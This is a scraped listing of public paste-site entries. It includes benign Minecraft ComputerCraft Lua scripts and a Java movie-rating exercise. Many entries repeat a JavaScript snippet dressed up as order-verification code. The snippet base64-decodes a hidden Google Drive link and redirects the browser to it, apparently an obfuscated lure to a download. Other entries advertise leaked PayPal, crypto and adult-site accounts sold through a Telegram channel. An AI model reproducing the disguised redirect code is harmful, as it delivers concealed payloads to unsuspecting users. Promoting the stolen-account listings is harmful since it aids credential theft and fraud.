        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
u65mWd0H,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Monday 28th of April 2025 05:13:22 PM CDT,03252 Accounts Posted On https://t.me/leakzbyeminem
ZL84pXvX,Order.js,dentira,JavaScript,Monday 28th of April 2025 05:00:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76851/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Gp73j3pw,Chaturbate with Tokens,Epiphemeral,JavaScript,Monday 28th of April 2025 04:58:00 PM CDT,44541 Accounts Posted On https://t.me/leakzbyeminem
Tj4T9caL,Market.js,dentira,JavaScript,Monday 28th of April 2025 04:44:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64967/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Q7cJfqmq,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 04:42:39 PM CDT,86319 Accounts Posted On https://t.me/leakzbyeminem
h2bnQgcY,ae2-monitor v3,DubSlime,Lua,Monday 28th of April 2025 04:28:57 PM CDT,"-- AE2 Monitor Deluxe Edition
-- Light Theme + Crafting + Storage Recap + Sorted Items + Popup Details
-- By ChatGPT

-- Find peripherals
local monitor = peripheral.find(""monitor"")
local me = peripheral.find(""meBridge"")

if not monitor then error(""No monitor connected!"") end
if not me then error(""No ME Bridge connected!"") end

-- SETTINGS
monitor.setTextScale(0.5)
local w, h = monitor.getSize()
local itemsPerPage = h - 8
local pageCrafting = 1
local pageStorage = 1
local activeTab = ""crafting""
local blinkState = true
local selectedItem = nil
local history = {}

-- COLORS
local bgColor = colors.white
local textColor = colors.black
local tabActive = colors.lightBlue
local tabInactive = colors.gray
local footerColor = colors.lightGray
local busyColor = colors.blue
local overloadedColor = colors.red
local idleColor = colors.green
local popupColor = colors.orange

-- UTILITIES
local function centerText(text, y, textCol, bgCol)
    monitor.setCursorPos(math.floor((w - #text) / 2) + 1, y)
    monitor.setTextColor(textCol or textColor)
    monitor.setBackgroundColor(bgCol or bgColor)
    monitor.write(text)
end

local function drawBlock(x1, y1, x2, y2, bg)
    monitor.setBackgroundColor(bg)
    for y = y1, y2 do
        monitor.setCursorPos(x1, y)
        monitor.write(string.rep("" "", x2 - x1 + 1))
    end
end

local function drawButton(x1, x2, label, enabled)
    monitor.setBackgroundColor(enabled and colors.lightBlue or colors.gray)
    local mid = math.floor((x1 + x2) / 2) - math.floor(#label / 2)
    monitor.setCursorPos(mid, h)
    monitor.setTextColor(colors.black)
    monitor.write(label)
end

local function drawTabs()
    local half = math.floor(w / 2)
    drawBlock(1, 1, w, 2, footerColor)

    drawBlock(1, 1, half, 2, activeTab == ""crafting"" and tabActive or tabInactive)
    centerText(""Crafting"", 1, colors.white, activeTab == ""crafting"" and tabActive or tabInactive)

    drawBlock(half + 1, 1, w, 2, activeTab == ""storage"" and tabActive or tabInactive)
    monitor.setCursorPos(half + math.floor((half - 7) / 2), 1)
    monitor.setTextColor(colors.white)
    monitor.write(""Storage"")
end

local function drawProgressBar(x, y, width, percentage, fgColor, bgColor)
    local fillWidth = math.floor(width * percentage + 0.5)
    monitor.setCursorPos(x, y)
    monitor.setBackgroundColor(fgColor)
    monitor.write(string.rep("" "", fillWidth))
    monitor.setBackgroundColor(bgColor)
    monitor.write(string.rep("" "", width - fillWidth))
end

local function drawCraftingTab()
    monitor.setBackgroundColor(bgColor)
    monitor.clear()
    drawTabs()
    centerText(""Ongoing Crafting Jobs"", 4, textColor, bgColor)

    local cpus = me.getCraftingCPUs() or {}
    local totalPages = math.max(1, math.ceil(#cpus / itemsPerPage))
    pageCrafting = math.min(pageCrafting, totalPages)

    local startIdx = (pageCrafting - 1) * itemsPerPage + 1
    local endIdx = math.min(#cpus, startIdx + itemsPerPage - 1)

    local y = 6
    for idx = startIdx, endIdx do
        local cpu = cpus[idx]
        if cpu then
            local name = cpu.name or (""CPU #"" .. idx)
            if name == """" then name = ""Unnamed CPU"" end
            local busy = cpu.isBusy

            local cpuColor = idleColor
            if busy then
                cpuColor = blinkState and busyColor or overloadedColor
            end

            drawBlock(2, y, w - 1, y + 2, footerColor)
            monitor.setCursorPos(4, y + 1)
            monitor.setTextColor(textColor)
            monitor.write(name:sub(1, w - 15))

            local usage = busy and 0.6 or 0.1
            monitor.setCursorPos(w - 15, y + 1)
            drawProgressBar(w - 15, y + 1, 13, usage, cpuColor, colors.gray)

            y = y + 4
        end
    end

    drawBlock(1, h, w, h, footerColor)
    drawButton(1, math.floor(w / 2) - 1, ""< Prev"", pageCrafting > 1)
    drawButton(math.floor(w / 2) + 1, w, ""Next >"", pageCrafting < totalPages)
    centerText(""Page "" .. pageCrafting .. ""/"" .. totalPages, h - 1, textColor, footerColor)
end

local function sortByAmountDesc(a, b)
    return (a.amount or 0) > (b.amount or 0)
end

local storageCache = {}

local function drawStorageTab()
    monitor.setBackgroundColor(bgColor)
    monitor.clear()
    drawTabs()
    centerText(""Storage Overview"", 4, textColor, bgColor)

    storageCache = me.listItems() or {}
    table.sort(storageCache, sortByAmountDesc)

    local totalPages = math.max(1, math.ceil(#storageCache / itemsPerPage))
    pageStorage = math.min(pageStorage, totalPages)

    local startIdx = (pageStorage - 1) * itemsPerPage + 1
    local endIdx = math.min(#storageCache, startIdx + itemsPerPage - 1)

    local y = 6
    for idx = startIdx, endIdx do
        local item = storageCache[idx]
        local name = item.displayName or ""Unknown""
        local amount = item.amount or 0

        if idx - startIdx < 5 then
            drawBlock(2, y, w - 1, y, colors.lightBlue)
            monitor.setTextColor(colors.white)
        else
            monitor.setBackgroundColor(bgColor)
            monitor.setTextColor(textColor)
        end

        monitor.setCursorPos(3, y)
        monitor.write(name:sub(1, 20))

        monitor.setCursorPos(w - 10, y)
        monitor.write(""x"" .. amount)

        y = y + 1
    end

    drawBlock(1, h, w, h, footerColor)
    drawButton(1, math.floor(w / 2) - 1, ""< Prev"", pageStorage > 1)
    drawButton(math.floor(w / 2) + 1, w, ""Next >"", pageStorage < totalPages)
    centerText(""Page "" .. pageStorage .. ""/"" .. totalPages, h - 1, textColor, footerColor)
end

local function drawPopup()
    if not selectedItem then return end

    local winW = math.floor(w * 0.7)
    local winH = math.floor(h * 0.7)
    local startX = math.floor((w - winW) / 2)
    local startY = math.floor((h - winH) / 2)

    drawBlock(startX, startY, startX + winW, startY + winH, popupColor)
    monitor.setTextColor(textColor)

    monitor.setCursorPos(startX + 2, startY + 1)
    monitor.write(""Item: "" .. (selectedItem.displayName or ""Unknown""))

    monitor.setCursorPos(startX + 2, startY + 2)
    monitor.write(""Stored: "" .. (selectedItem.amount or 0))

    monitor.setCursorPos(startX + 2, startY + 3)
    monitor.write(""Live Trend:"")

    -- Tiny Graph
    local graphWidth = winW - 4
    local graphStartX = startX + 2
    local graphStartY = startY + 5
    local graphHeight = 5

    local maxVal = 1
    for _, v in ipairs(history) do
        if v > maxVal then maxVal = v end
    end

    for i = 1, math.min(graphWidth, #history) do
        local val = history[#history - i + 1] or 0
        local height = math.floor((val / maxVal) * graphHeight)

        for j = 0, height - 1 do
            monitor.setCursorPos(graphStartX + graphWidth - i, graphStartY + graphHeight - j)
            monitor.write(""."")
        end
    end

    monitor.setCursorPos(startX + math.floor(winW / 2) - 3, startY + winH - 1)
    monitor.write(""[ Close ]"")
end

local function handleTouch(x, y)
    x = tonumber(x)
    if not x then return end

    if selectedItem then
        selectedItem = nil
        history = {}
        return
    end

    local half = math.floor(w / 2)
    if y <= 2 then
        if x <= half then
            activeTab = ""crafting""
            pageCrafting = 1
        else
            activeTab = ""storage""
            pageStorage = 1
        end
    elseif y == h then
        if activeTab == ""crafting"" then
            local cpus = me.getCraftingCPUs() or {}
            if x < w / 2 and pageCrafting > 1 then
                pageCrafting = pageCrafting - 1
            elseif x >= w / 2 and pageCrafting < math.ceil(#cpus / itemsPerPage) then
                pageCrafting = pageCrafting + 1
            end
        elseif activeTab == ""storage"" then
            local storage = me.listItems() or {}
            if x < w / 2 and pageStorage > 1 then
                pageStorage = pageStorage - 1
            elseif x >= w / 2 and pageStorage < math.ceil(#storage / itemsPerPage) then
                pageStorage = pageStorage + 1
            end
        end
    elseif activeTab == ""storage"" and y >= 6 and y <= h - 2 then
        local idx = (y - 6) + (pageStorage - 1) * itemsPerPage + 1
        if storageCache[idx] then
            selectedItem = storageCache[idx]
            history = {selectedItem.amount or 0}
        end
    end
end

local function updateHistory()
    if selectedItem then
        local fresh = me.getItem({name = selectedItem.name})
        if fresh then
            table.insert(history, fresh.amount or 0)
            if #history > 100 then
                table.remove(history, 1)
            end
            selectedItem.amount = fresh.amount
        end
    end
end

-- MAIN LOOP
parallel.waitForAny(
    function()
        while true do
            blinkState = not blinkState
            if activeTab == ""crafting"" then
                drawCraftingTab()
            elseif activeTab == ""storage"" then
                drawStorageTab()
            end
            drawPopup()
            sleep(0.5)
            updateHistory()
        end
    end,
    function()
        while true do
            local _, side, x, y = os.pullEvent(""monitor_touch"")
            handleTouch(x, y)
        end
    end
)
"
Txxr1L7a,Untitled,dentira,JavaScript,Monday 28th of April 2025 04:28:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70451/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iWBzpiqw,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 04:27:17 PM CDT,46717 Accounts Posted On https://t.me/leakzbyeminem
bNMihWHY,Products.js,dentira,JavaScript,Monday 28th of April 2025 04:13:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77268/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XaMgGqW7,Leaked Accounts - Fresh Hits,Epiphemeral,JavaScript,Monday 28th of April 2025 04:11:55 PM CDT,60277 Accounts Posted On https://t.me/leakzbyeminem
6JhdMfzr,CC: Wither Status,LoaderB0T,Lua,Monday 28th of April 2025 04:03:30 PM CDT,"-- ComputerCraft
-- Writes text to a minecraft create display based on redstone inputs
print(""Starting Display"")

-- Set up the display
local display = peripheral.wrap(""top"") -- Wrap the display on top of the computer
if not display then
    print(""No display found"")
    return
end

display.clear() -- Clear the display
display.setCursorPos(1, 1) -- Set the cursor position to the top left corner
display.write(""Display ready!"") -- Write a message to the display
display.update() -- Update the display to show the message

-- Wait for 4 seconds before clearing the display
os.sleep(4)
display.clear() -- Clear the display
display.update() -- Update the display to show the cleared screen

local previous_state = nil -- Variable to store the previous state

while true do
    local active_hostile = redstone.getInput(""back"")
    local active_neutral = redstone.getInput(""front"")
    local active_spawnDelay = redstone.getInput(""right"")
    local active_chicken = redstone.getInput(""bottom"")
    local active_missing = redstone.getInput(""left"")

    -- log the states to the console

    print(""Hostile: "" .. tostring(active_hostile))
    print(""Neutral: "" .. tostring(active_neutral))
    print(""Spawn Delay: "" .. tostring(active_spawnDelay))
    print(""Chicken: "" .. tostring(active_chicken))
    print(""Missing: "" .. tostring(active_missing))

    local state_spawning = active_spawnDelay
    local state_chicken = active_chicken
    local state_killing = active_hostile and not active_spawnDelay and not active_chicken
    local state_clearing = active_neutral and not state_killing and not state_chicken
    local state_missing = active_missing
    local state_idle = not state_spawning and not state_killing and not state_clearing and not state_missing and
                           not state_chicken

    local current_state = nil -- Variable to store the current state
    if state_spawning then
        current_state = ""Spawning Wither""
    elseif state_killing then
        current_state = ""Killing Wither""
    elseif state_chicken then
        current_state = ""Deploying Chicken""
    elseif state_clearing then
        current_state = ""Clearing Chamber""
    elseif state_missing then
        current_state = ""Missing Resources""
    elseif state_idle then
        current_state = ""Idle...""
    end

    if current_state == previous_state then
        -- If the state hasn't changed, skip the display update
        print(""State hasn't changed, skipping display update"")
        os.sleep(1) -- Sleep for 1 second before checking the states again
        goto continue -- Skip to the next iteration of the loop
    end
    previous_state = current_state -- Update the previous state
    print(""State changed to: "" .. current_state) -- Log the state change to the console

    -- Display the states on the screen
    display.clear() -- Clear the display
    display.setCursorPos(1, 1) -- Set the cursor position to the top left corner
    display.write(""State:"") -- Write a message to the display
    display.setCursorPos(1, 2) -- Move the cursor to the next line
    display.write(current_state) -- Write the current state to the display
    display.update() -- Update the display to show the current state

    -- Sleep for 1 second before checking the states again
    os.sleep(1)

    ::continue:: -- Label to skip to the next iteration of the loop
end
"
wirctk7t,Order.js,dentira,JavaScript,Monday 28th of April 2025 03:58:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81848/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
snVtkxN7,Chaturbate with Tokens,Epiphemeral,JavaScript,Monday 28th of April 2025 03:56:33 PM CDT,20545 Accounts Posted On https://t.me/leakzbyeminem
YMkrx2aQ,Market.js,dentira,JavaScript,Monday 28th of April 2025 03:42:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05225/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
D9VbgNZm,Crypto Accounts,Epiphemeral,JavaScript,Monday 28th of April 2025 03:41:12 PM CDT,37218 Accounts Posted On https://t.me/leakzbyeminem
yJG9AF0z,Untitled,dentira,JavaScript,Monday 28th of April 2025 03:27:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70698/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
7yvEtqsg,PayPal with Balance,Epiphemeral,JavaScript,Monday 28th of April 2025 03:25:39 PM CDT,54538 Accounts Posted On https://t.me/leakzbyeminem
vsHz2WvX,Products.js,Epiphemeral,JavaScript,Monday 28th of April 2025 03:11:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48981/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GDGgp8ZZ,[NP] Letterboxd,dzocesrce,Java,Monday 28th of April 2025 03:02:42 PM CDT,"import java.util.*;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
class Rating {

    Movie movie;
    int rating;

    public Rating( Movie movie, int rating) {

        this.movie = movie;
        this.rating = rating;
    }

    public Movie getMovie() {
        return movie;
    }

    public int getRating() {
        return rating;
    }

    @Override
    public String toString() {
        return String.format(""%s"",movie.toString());
    }
}

class User {
    String id;
    String username;


    public User(String id, String username) {
        this.id = id;
        this.username = username;

    }

    @Override
    public String toString() {
        return String.format(""User ID: %s Name: %s"",id,username);
    }
}



class Movie implements Comparable<Movie> {
    String id;
    String name;
    List<Integer> ratings;

    public Movie(String id, String name) {
        this.id = id;
        this.name = name;
        this.ratings = new ArrayList<>();
    }

    public double getAverageRating() {
        return ratings.stream().mapToInt(i->i).average().orElse(0.0);
    }

    @Override
    public String toString() {
        return String.format(""Movie ID: %s Title: %s Rating: %.2f"",id,name,getAverageRating());
    }

    @Override
    public int compareTo(Movie o) {
        return Comparator.comparing(Movie::getAverageRating).reversed().compare(this,o);
    }
}
class CosineSimilarityCalculator {

    public static double cosineSimilarity(Map<String, Integer> c1, Map<String, Integer> c2) {
        return cosineSimilarity(c1.values(), c2.values());
    }

    public static double cosineSimilarity(Collection<Integer> c1, Collection<Integer> c2) {
        int[] array1;
        int[] array2;
        array1 = c1.stream().mapToInt(i -> i).toArray();
        array2 = c2.stream().mapToInt(i -> i).toArray();
        double up = 0.0;
        double down1 = 0, down2 = 0;

        for (int i = 0; i < c1.size(); i++) {
            up += (array1[i] * array2[i]);
        }

        for (int i = 0; i < c1.size(); i++) {
            down1 += (array1[i] * array1[i]);
        }

        for (int i = 0; i < c1.size(); i++) {
            down2 += (array2[i] * array2[i]);
        }

        return up / (Math.sqrt(down1) * Math.sqrt(down2));
    }
}

class StreamingPlatform {

    Map<String, Movie> movies;
    Map<String, User> users;
    Map<String, List<Rating>> ratingsByUser;

    public StreamingPlatform() {
        this.movies = new HashMap<>();
        this.users = new HashMap<>();
        this.ratingsByUser = new HashMap<>();
    }

    public void addMovie(String id, String name) {
        movies.putIfAbsent(id, new Movie(id, name));
    }

    public void addUser(String id, String name) {
        users.putIfAbsent(id, new User(id, name));
    }

    public void addRating(String userId, String movieId, int rating) {
        movies.get(movieId).ratings.add(rating);
        ratingsByUser.putIfAbsent(userId, new ArrayList<>());
        ratingsByUser.get(userId).add(new Rating(movies.get(movieId), rating));
    }

    public void topNMovies(int n) {
        movies.values().stream().sorted().limit(n).forEach(i -> System.out.println(i));
    }

    public void favouriteMoviesForUsers(List<String> users) {
        for (String userId : users) {
            int maxRating = ratingsByUser.get(userId).stream().map(i -> i.getRating()).max(Comparator.naturalOrder()).orElse(0);
            System.out.println(this.users.get(userId));
            ratingsByUser.get(userId).stream().filter(i -> i.getRating() == maxRating)
                    .map(i -> i.getMovie())
                    .sorted()
                    .forEach(i -> System.out.println(i));
            System.out.println();
        }

    }

    public void similarUsers(String userId) {
    Map<User,Double> cosineSimularityByUser = new HashMap<>();
        for (User u : users.values().stream().filter(i -> !i.id.equals(userId)).collect(Collectors.toList())) {
            Map<String, Integer> mapOfRatings = new LinkedHashMap<>();
            Map<String, Integer> ratingsByAnotherUser = new LinkedHashMap<>();
            movies.values().stream().forEach(i -> mapOfRatings.putIfAbsent(i.id, 0));
            ratingsByUser.get(userId).stream().forEach(i -> mapOfRatings.computeIfPresent(i.movie.id, (k, v) -> i.getRating()));
            movies.values().stream().forEach(i -> ratingsByAnotherUser.putIfAbsent(i.id, 0));
            ratingsByUser.get(u.id).stream()
                    .forEach(i -> ratingsByAnotherUser.computeIfPresent(i.movie.id, (k, v) -> i.getRating()));

            cosineSimularityByUser.putIfAbsent(u,CosineSimilarityCalculator.cosineSimilarity(mapOfRatings, ratingsByAnotherUser));
//            System.out.println(String.format(""User ID: %s Name: %s %f"",
//                    u.id, u.username, CosineSimilarityCalculator.cosineSimilarity(mapOfRatings, ratingsByAnotherUser)));
        }
        cosineSimularityByUser.entrySet().stream().sorted(Map.Entry.<User, Double> comparingByValue(Comparator.reverseOrder()))
                .forEach(i -> System.out.println(String.format(""User ID: %s Name: %s %f"",
                        i.getKey().id,i.getKey().username,i.getValue())));

    }
}
public class StreamingPlatform2 {
    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);

        StreamingPlatform sp = new StreamingPlatform();

        while (sc.hasNextLine()){
            String line = sc.nextLine();
            String [] parts = line.split(""\\s+"");

            if (parts[0].equals(""addMovie"")) {
                String id = parts[1];
                String name = Arrays.stream(parts).skip(2).collect(Collectors.joining("" ""));
                sp.addMovie(id ,name);
            } else if (parts[0].equals(""addUser"")){
                String id = parts[1];
                String name = parts[2];
                sp.addUser(id ,name);
            } else if (parts[0].equals(""addRating"")){
                //String userId, String movieId, int rating
                String userId = parts[1];
                String movieId = parts[2];
                int rating = Integer.parseInt(parts[3]);
                sp.addRating(userId, movieId, rating);
            } else if (parts[0].equals(""topNMovies"")){
                int n = Integer.parseInt(parts[1]);
                System.out.println(""TOP "" + n + "" MOVIES:"");
                sp.topNMovies(n);
            } else if (parts[0].equals(""favouriteMoviesForUsers"")) {
                List<String> users = Arrays.stream(parts).skip(1).collect(Collectors.toList());
                System.out.println(""FAVOURITE MOVIES FOR USERS WITH IDS: "" + users.stream().collect(Collectors.joining("", "")));
                sp.favouriteMoviesForUsers(users);
            } else if (parts[0].equals(""similarUsers"")) {
                String userId = parts[1];
                System.out.println(""SIMILAR USERS TO USER WITH ID: "" + userId);
                sp.similarUsers(userId);
            }
        }
    }
}"
KYBdreXY,News April28 25,Newscaster_Ned,Email,Monday 28th of April 2025 03:02:08 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎

P‎a‎k‎i‎s‎t‎a‎n‎ ‎K‎i‎l‎l‎s‎ ‎D‎o‎z‎e‎n‎s‎ ‎o‎f‎ ‎'‎M‎i‎l‎i‎t‎a‎n‎t‎s‎'‎ ‎A‎t‎t‎e‎m‎p‎t‎i‎n‎g‎ ‎t‎o‎ ‎C‎r‎o‎s‎s‎ ‎A‎f‎g‎h‎a‎n‎ ‎B‎o‎r‎d‎e‎r‎
